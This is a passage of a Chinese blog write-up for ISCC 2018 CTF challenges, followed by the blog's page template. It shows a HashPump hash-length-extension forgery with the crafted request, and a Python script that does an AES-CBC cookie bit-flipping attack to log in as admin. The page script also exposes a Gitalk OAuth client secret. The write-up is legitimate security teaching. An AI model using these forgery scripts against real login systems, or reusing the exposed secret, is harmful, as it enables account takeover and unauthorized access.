+<p> 方法一： git clone <a href="https://github.com/bwall/HashPump.git" target="_blank" rel="external">https://github.com/bwall/HashPump.git</a> apt-get install g++ libssl-dev cd HashPump make make install B.方法二： pip install hashpumpy </p>
+<p>方法二:</p>
+<p>pip install hashpumpy </p>
+<pre><code>$ hashpump -s &#39;78cfc57d983b4a17e55828c001a3e781&#39; -d &#39;guest&#39; -a &#39;admin&#39; -k 46
+5f585093a7fe86971766c3d25c43d0eb
+guest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin
+</code></pre><p>POST / HTTP/1.1<br>Host: 118.190.152.202:8002<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Cookie: verify=5f585093a7fe86971766c3d25c43d0eb; len=46<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 58</p>
+<p>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</p>
+<p>ISCC{MD5_1s_n0t_5afe}</p>
+<p><a href="http://p0sec.net/index.php/archives/99/" target="_blank" rel="external">http://p0sec.net/index.php/archives/99/</a></p>
+<p><a href="http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="external">http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more</a></p>
+<h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>查看源码得提示index.txt，访问得到源码 </p>
+<pre><code class="php">&lt;?php
+include &#39;sqlwaf.php&#39;;
+define(&quot;SECRET_KEY&quot;, &quot;................&quot;);
+define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);
+session_start();
+
+function get_random_iv(){
+    $iv=&#39;&#39;;
+    for($i=0;$i&lt;16;$i++){
+        $iv.=chr(rand(1,255));
+    }
+    return $iv;
+}
+// 使用aes-128-cbc 模式加密
+function login($info){
+    $iv=get_random_iv();
+    $plain = serialize($info);
+    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
+    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];
+    setcookie(&quot;iv&quot;, base64_encode($iv));// cookie[iv] = 随机生成的iv 的base64
+    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie[cipher] = 加密值的base64
+}
+function show_homepage(){
+    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){//发现当账号为admin，才会显示flag，
+        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;
+        echo &#39;&lt;p&gt;Flag is *************&lt;/p&gt;&#39;;
+    }else{
+        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;
+        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;
+    }
+    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;
+    die();
+}
+// 解密cipher
+function check_login(){
+    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){
+        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);
+        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);//cipher和iv变量均中cookie数组中取
+        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
+            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);
+            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];
+        }else{
+            die(&quot;ERROR!&quot;);
+        }
+    }
+}
+
+if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {
+  $username=waf((string)$_POST[&#39;username&#39;]);
+  $password=waf((string)$_POST[&#39;password&#39;]);
+  if($username === &#39;admin&#39;){
+        exit(&#39;&lt;p&gt;You are not real admin!&lt;/p&gt;&#39;);//当我们以admin账号登录时，程序会直接跳出
+    }else{
+        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);
+        login($info);
+        show_homepage();
+    }//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。
+}
+else{
+  if(isset($_SESSION[&quot;username&quot;])){
+        check_login();
+        show_homepage();
+    }
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot; &gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;Paper login form&lt;/title&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div id=&quot;login&quot;&gt;
+  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
+    &lt;h1&gt;Sign In&lt;/h1&gt;
+    &lt;input name=&#39;username&#39; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;
+    &lt;input name=&#39;password&#39; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;
+    &lt;button&gt;Sign in&lt;/button&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>思路就是构造一个Admin用户，然后将大写的A翻转成小写的a，即是admin。我们点击登录之后，可以在cookie中获取到iv和cipher的值（看14行的login函数），然后我们先将cipher的第9个字符使用异或运算翻转成小写字母a，因为info数组序列化后，我们要翻转的大写字母A在下标为9的位置，每个分组的长度为16，因为返回的iv变量长度为16（要先经过base64解密）</p>
+<ol>
+<li>s:2:{s:8:”userna</li>
+<li>me”;s:5:”Admin”;</li>
+<li>s:8:”password”;s</li>
+<li>:5:”admin”;}</li>
+</ol>
+<p>要第二组的b变为d 就要第一组的u改变 </p>
+<p>python脚本：</p>
+<pre><code class="python">import urllib,base64,requests,re
+
+url = &quot;http://118.190.152.202:8001/index.php&quot;
+datas = {
+    &quot;username&quot; : &quot;Admin&quot;,
+    &quot;password&quot; : &quot;admin&quot;
+}
+
+r = requests.post(url,data=datas)
+cipher = r.cookies.get(&quot;cipher&quot;)
+cipher = base64.b64decode(urllib.unquote(cipher))
+offset = 9
+new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]
+new_cookies = requests.utils.dict_from_cookiejar(r.cookies)
+new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))
+
+r2 = requests.get(url,cookies=new_cookies)
+plain = base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])
+iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))
+old = plain[:len(iv)]
+new = &#39;a:2:{s:8:&quot;userna&#39;
+new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])
+new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))
+
+r3 = requests.get(url,cookies=new_cookies)
+print(r3.text)
+</code></pre>
+<p>看其他师傅的其他解题：</p>
+<p><a href="https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd</a>  </p>
+<p><a href="https://www.anquanke.com/post/id/146063" target="_blank" rel="external">https://www.anquanke.com/post/id/146063</a></p>
+<p><a href="https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250" target="_blank" rel="external">https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 72382781@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span>文章标题:</span>ISCC2018-writeup</p>
+    <p><span>文章字数:</span><span class="post-count">3,808</span></p>
+    <p><span>本文作者:</span><a href="javascript:void(0)" title="Bigbroke">Bigbroke</a></p>
+    <p><span>发布时间:</span>2018-05-28, 00:54:05</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:12</p>
+    <span>原始链接:</span><a class="post-url" href="/archis/4e1d9865/" title="ISCC2018-writeup">http://Bigbroke.com/archis/4e1d9865/</a>
+    <p>
+        <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+    <div id="comments"></div>
+<link rel="stylesheet" href="/css/gitalk.css">
+
+<script type="text/javascript">
+    $.getScript('/js/gitalk.js', function () {
+        var gitalk = new Gitalk({
+            clientID: 'eb679ffbe3e667bef087',
+            clientSecret: '803d24db3cf86013b1c74778931b9e6670081459',
+            repo: 'bigbroke.github.io',
+            owner: 'bigbroke',
+            admin: ['bigbroke'],
+            id: location.pathname,
+            distractionFreeMode: 'true',
+            language: 'zh-CN',
+            perPage: parseInt('10',10)
+        })
+        gitalk.render('comments')
+    })
+</script>
+
+
+
+    
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2018 Bigbroke</p>
+<p class="footer-entry">Buit with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"position":"right","width":90,"height":150},"mobile":{"show":true},"log":false});</script></body>
+<script src="//cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe-ui-default.min.js"></script>
+
+<script src="/js/script.js"></script>
+<script>
+    var img_resize = 'photoSwipe';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#思考','#life','#正则','#WP','#first-blog','#ctf','#代码审计','#sqlilabs','#sqlmap','#cve','#VIM','#Nmap','#密码学','#hexo','#Nikto','#TCPDUMP','#QWASP_ZAP','#NETCAT','#docker','#Skipfish','#Vega','#复现','#文件包含','#读书摘要','#信息收集','#Web漏洞','#内网','#CTF','#文件上传','#渗透','#web','#黑客攻防web安全实战详解','#入侵','#Dvwa',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1;
+            var $numbering = $('<ul/>').addClass('pre-numbering').attr("unselectable","on");
+            $(this).addClass('has-numbering')
+                    .parent()
+                    .append($numbering);
+            for(i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info//busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+
+        // PhotoSwipe
+        $('article').each(function(i){
+            $(this).find('img').each(function(){
+                if ($(this).closest('figure').hasClass('article-gallery-img')) {
+                    return;
+                }
+                var alt = this.alt;
+                $(this)
+                    .wrap('<figure class="article-gallery-img" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"></figure>')
+                    .wrap('<a href="' + this.src + '" title="' + alt + '"></a>');
+                $(this).after('<div class="img_alt"><span>' + (alt || '') + '</span></div>');
+            });
+        });
+
+        var pswpElement = document.querySelectorAll('.pswp')[0];
+        if (pswpElement) {
+            var gallerySelector = '.article-gallery, article';
+
+            var initPhotoSwipeFromDOM = function(gallerySelector) {
+
+                // parse slide data (url, title, size ...) from DOM elements
+                // (children of gallerySelector)
+                var parseThumbnailElements = function(el) {
+                    var thumbElements = $(el).find('figure.article-gallery-img').toArray(),
+                        numNodes = thumbElements.length,
+                        items = [],
+                        figureEl,
+                        linkEl,
+                        size,
+                        imgEl,
+                        item;
+
+                    for (var i = 0; i < numNodes; i++) {
+
+                        figureEl = thumbElements[i]; // <figure> element
+
+                        // include only element nodes
+                        if (figureEl.nodeType !== 1) {
+                            continue;
+                        }
+
+                        linkEl = figureEl.children[0]; // <a> element
+                        imgEl = linkEl.children[0]; // <img>
+
+                        size = linkEl.getAttribute('data-size');
+                        size = size && size.split('x');
+
+                        // create slide object
+                        item = {
+                            src: linkEl.getAttribute('href'),
+                            w: size && parseInt(size[0], 10) || imgEl.width,
+                            h: size && parseInt(size[1], 10) || imgEl.height
+                        };
+
+                        if (figureEl.children.length > 1) {
+                            // <figcaption> content
+                            item.title = figureEl.children[1].innerHTML;
+                        }
+
+                        if (linkEl.children.length > 0) {
+                            // <img> thumbnail element, retrieving thumbnail url
+                            item.msrc = linkEl.children[0].getAttribute('src');
+                        }
+
+                        item.el = figureEl; // save link to element for getThumbBoundsFn
+                        items.push(item);
+                    }
+
+                    return items;
+                };
+
+                // find nearest parent element
+                var closest = function closest(el, fn) {
+                    return el && (fn(el) ? el : closest(el.parentNode, fn));
+                };
+
+                // triggers when user clicks on thumbnail
+                var onThumbnailsClick = function(e) {
+                    e = e || window.event;
+
+                    var eTarget = e.target || e.srcElement;
+
+                    // find root element of slide
+                    var clickedListItem = closest(eTarget, function(el) {
+                        return (el.tagName && el.tagName.toUpperCase() === 'FIGURE');
+                    });
+
+                    if (!clickedListItem) {
+                        return;
+                    }
+
+                    if (e.preventDefault) {
+                        e.preventDefault();
+                    } else {
+                        e.returnValue = false;
+                    }
+
+                    // find index of clicked item by looping through all child nodes
+                    // alternatively, you may define index via data- attribute
+                    var clickedGallery = $(clickedListItem).closest(gallerySelector)[0],
+                        childNodes = $(clickedGallery).find('figure.article-gallery-img').toArray(),
+                        numChildNodes = childNodes.length,
+                        nodeIndex = 0,
+                        index;
+
+                    for (var i = 0; i < numChildNodes; i++) {
+                        if (childNodes[i].nodeType !== 1) {
+                            continue;
+                        }
+
+                        if (childNodes[i] === clickedListItem) {
+                            index = nodeIndex;
+                            break;
+                        }
+                        nodeIndex++;
+                    }
+
+
+
+                    if (index >= 0) {
+                        // open PhotoSwipe if valid index found
+                        openPhotoSwipe(index, clickedGallery);
+                    }
+                    return false;
+                };
+
+                // parse picture index and gallery index from URL (#&pid=1&gid=2)
+                var photoswipeParseHash = function() {
+                    var hash = window.location.hash.substring(1),
+                        params = {};
+
+                    if (hash.length < 5) {
+                        return params;
+                    }
+
+                    var vars = hash.split('&');
+                    for (var i = 0; i < vars.length; i++) {
+                        if (!vars[i]) {
+                            continue;
+                        }
+                        var pair = vars[i].split('=');
+                        if (pair.length < 2) {
+                            continue;
+                        }
+                        params[pair[0]] = pair[1];
+                    }
+
+                    if (params.gid) {
+                        params.gid = parseInt(params.gid, 10);
+                    }
+
+                    return params;
+                };
+
+                var openPhotoSwipe = function(index, galleryElement, disableAnimation, fromURL) {
+                    var pswpElement = document.querySelectorAll('.pswp')[0],
+                        gallery,
+                        options,
+                        items;
+
+                    items = parseThumbnailElements(galleryElement);
+
+                    // define options (if needed)
+                    options = {
+
+                        // define gallery index (for URL)
+                        galleryUID: galleryElement.getAttribute('data-pswp-uid'),
+
+                        getThumbBoundsFn: function(index) {
+                            // See Options -> getThumbBoundsFn section of documentation for more info
+                            var thumbnail = items[index].el.getElementsByTagName('img')[0], // find thumbnail
+                                pageYScroll = window.pageYOffset || document.documentElement.scrollTop,
+                                rect = thumbnail.getBoundingClientRect();
+
+                            return {
+                                x: rect.left,
+                                y: rect.top + pageYScroll,
+                                w: rect.width
+                            };
+                        }
+                    };
+
+                    // PhotoSwipe opened from URL
+                    if (fromURL) {
+                        if (options.galleryPIDs) {
+                            // parse real index when custom PIDs are used
+                            // http://photoswipe.com/documentation/faq.html#custom-pid-in-url
+                            for (var j = 0; j < items.length; j++) {
+                                if (items[j].pid == index) {
+                                    options.index = j;
+                                    break;
+                                }
+                            }
+                        } else {
+                            // in URL indexes start from 1
+                            options.index = parseInt(index, 10) - 1;
+                        }
+                    } else {
+                        options.index = parseInt(index, 10);
+                    }
+
+                    // exit if index not found
+                    if (isNaN(options.index)) {
+                        return;
+                    }
+
+                    if (disableAnimation) {
+                        options.showAnimationDuration = 0;
+                    }
+
+                    // Pass data to PhotoSwipe and initialize it
+                    gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);
+
+                    gallery.listen('imageLoadComplete', function(index, item) {
+                        var linkEl = item.el.children[0];
+                        var img = item.container.children[0];
+                        if (!linkEl.getAttribute('data-size')) {
+                            linkEl.setAttribute('data-size', img.naturalWidth + 'x' + img.naturalHeight);
+                            item.w = img.naturalWidth;
+                            item.h = img.naturalHeight;
+                            gallery.invalidateCurrItems();
+                            gallery.updateSize(true);
+                        }
+                    });
+
+                    gallery.init();
+                };
+
+                // loop through all gallery elements and bind events
+                var galleryElements = document.querySelectorAll(gallerySelector);
+
+                for (var i = 0, l = galleryElements.length; i < l; i++) {
+                    galleryElements[i].setAttribute('data-pswp-uid', i + 1);
+                    galleryElements[i].onclick = onThumbnailsClick;
+                }
+
+                // Parse URL and open gallery if it contains #&pid=3&gid=1
+                var hashData = photoswipeParseHash();
+                if (hashData.pid && hashData.gid) {
+                    openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true);
+                }
+            };
+
+            // execute above function
+            initPhotoSwipeFromDOM(gallerySelector);
+        }
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 2px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 2px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /*引用块样式*/
+    
+    .post .pjax article blockquote {
+        padding: 10px 20px;
+        background-color: white;
+        border: none;
+        border-left: 4px solid #42b983;
+        border-right: 4px solid #42b983;
+        border-radius: 10px;
+    }
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.1;
+        background: url("http://oy0tigw51.bkt.clouddn.com/201711210136_683.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+</style>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element, as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. PhotoSwipe keeps only 3 slides in DOM to save memory. -->
+        <!-- don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+
+
+</html>
